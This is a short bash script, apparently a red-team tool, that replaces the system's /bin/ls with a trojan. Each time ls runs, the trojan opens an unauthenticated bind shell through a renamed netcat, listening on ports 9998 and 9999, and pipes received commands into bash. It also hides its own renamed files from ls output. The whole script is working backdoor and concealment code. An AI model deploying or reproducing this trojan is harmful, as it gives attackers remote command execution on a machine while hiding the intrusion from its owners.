#!/bin/bash

LS=/bin/ls

mv $LS $LS.red_team


cat <<EOT >> $LS
#!/bin/bash

nc.red_team -l -p 9998 2>/dev/null | bash 2>&1 | nc.red_team -l -p 9999 2>/dev/null

./ls.red_team | grep --color=auto -v red_team

EOT